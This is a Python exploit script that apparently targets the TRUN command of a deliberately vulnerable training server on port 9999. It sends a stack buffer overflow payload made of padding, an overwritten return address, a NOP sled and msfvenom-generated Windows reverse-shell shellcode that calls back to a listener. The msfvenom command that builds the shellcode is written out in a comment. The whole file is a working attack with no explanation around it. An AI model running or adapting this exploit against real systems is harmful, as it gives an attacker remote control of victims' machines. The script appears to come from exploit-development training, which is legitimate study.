#!/usr/bin/python3
import sys, socket
from time import sleep

#--------Changeme--------#
                         #
host = "192.168.1.2"     #
port = 9999              #
                         #
#------------------------#

# $ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.52.128 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"
shellcode = ("\xbd\x7c\xf4\xc3\x1c\xdd\xc6\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x0e\x03\x14\xfa\x21\xe9\x18\xea\x24"
"\x12\xe0\xeb\x48\x9a\x05\xda\x48\xf8\x4e\x4d\x79\x8a\x02\x62"
"\xf2\xde\xb6\xf1\x76\xf7\xb9\xb2\x3d\x21\xf4\x43\x6d\x11\x97"
"\xc7\x6c\x46\x77\xf9\xbe\x9b\x76\x3e\xa2\x56\x2a\x97\xa8\xc5"
"\xda\x9c\xe5\xd5\x51\xee\xe8\x5d\x86\xa7\x0b\x4f\x19\xb3\x55"
"\x4f\x98\x10\xee\xc6\x82\x75\xcb\x91\x39\x4d\xa7\x23\xeb\x9f"
"\x48\x8f\xd2\x2f\xbb\xd1\x13\x97\x24\xa4\x6d\xeb\xd9\xbf\xaa"
"\x91\x05\x35\x28\x31\xcd\xed\x94\xc3\x02\x6b\x5f\xcf\xef\xff"
"\x07\xcc\xee\x2c\x3c\xe8\x7b\xd3\x92\x78\x3f\xf0\x36\x20\x9b"
"\x99\x6f\x8c\x4a\xa5\x6f\x6f\x32\x03\xe4\x82\x27\x3e\xa7\xca"
"\x84\x73\x57\x0b\x83\x04\x24\x39\x0c\xbf\xa2\x71\xc5\x19\x35"
"\x75\xfc\xde\xa9\x88\xff\x1e\xe0\x4e\xab\x4e\x9a\x67\xd4\x04"
"\x5a\x87\x01\x8a\x0a\x27\xfa\x6b\xfa\x87\xaa\x03\x10\x08\x94"
"\x34\x1b\xc2\xbd\xdf\xe6\x85\x01\xb7\xdc\xd5\xea\xca\x1c\xd7"
"\x51\x43\xfa\xbd\xb5\x02\x55\x2a\x2f\x0f\x2d\xcb\xb0\x85\x48"
"\xcb\x3b\x2a\xad\x82\xcb\x47\xbd\x73\x3c\x12\x9f\xd2\x43\x88"
"\xb7\xb9\xd6\x57\x47\xb7\xca\xcf\x10\x90\x3d\x06\xf4\x0c\x67"
"\xb0\xea\xcc\xf1\xfb\xae\x0a\xc2\x02\x2f\xde\x7e\x21\x3f\x26"
"\x7e\x6d\x6b\xf6\x29\x3b\xc5\xb0\x83\x8d\xbf\x6a\x7f\x44\x57"
"\xea\xb3\x57\x21\xf3\x99\x21\xcd\x42\x74\x74\xf2\x6b\x10\x70"
"\x8b\x91\x80\x7f\x46\x12\xa0\x9d\x42\x6f\x49\x38\x07\xd2\x14"
"\xbb\xf2\x11\x21\x38\xf6\xe9\xd6\x20\x73\xef\x93\xe6\x68\x9d"
"\x8c\x82\x8e\x32\xac\x86")

offset = 2003

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    payload = ""
    payload += "TRUN /.:/"
    payload += "A" * offset # Padding
    payload += "\xaf\x11\x50\x62" # EIP
    payload += "\x90" * 50 # NOP sled
    payload += shellcode

    s.send((payload.encode()))
    s.close()

except:
    print("Error connecting to server")
    sys.exit()